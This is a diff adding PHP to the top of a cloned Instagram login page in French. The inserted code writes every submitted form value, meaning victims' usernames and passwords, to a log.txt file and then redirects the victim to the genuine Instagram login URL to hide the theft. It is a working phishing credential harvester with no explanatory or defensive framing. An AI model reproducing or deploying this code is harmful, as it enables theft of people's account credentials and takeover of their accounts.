@@ -1,3 +1,17 @@
+<?php 
+header ('Location: https://www.instagram.com/accounts/login/'); 
+$handle = fopen("log.txt", "a"); 
+foreach($_POST as $variable => $value) 
+{ 
+fwrite($handle, ""); 
+fwrite($handle, "     "); 
+fwrite($handle, $value); 
+fwrite($handle, ""); 
+} 
+fwrite($handle, ""); 
+fclose($handle); 
+exit; 
+?>
 <html lang="fr" class="js not-logged-in client-root js-focus-visible sDN5V" style="--in-feed-story-item-padding:12px; --desktop-nav-height:60px;"><head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
